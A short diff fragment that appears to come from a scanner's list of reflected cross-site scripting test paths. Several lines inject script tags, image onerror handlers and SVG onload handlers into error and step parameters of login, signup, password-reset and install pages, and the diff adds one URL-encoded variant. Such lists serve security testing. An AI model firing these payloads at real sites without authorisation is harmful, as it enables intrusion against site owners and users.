@@ -801,3 +801,4 @@
 /web/login?error=<script>alert(document.domain)</script>
 /web/signup?error=<img/src=x+onerror=alert(document.domain)>
 /web/reset_password?error=<svg/onload=alert(document.domain)>
+/install/index.php?step=%3Cscript%3Ealert(document.domain)%3C/script%3E
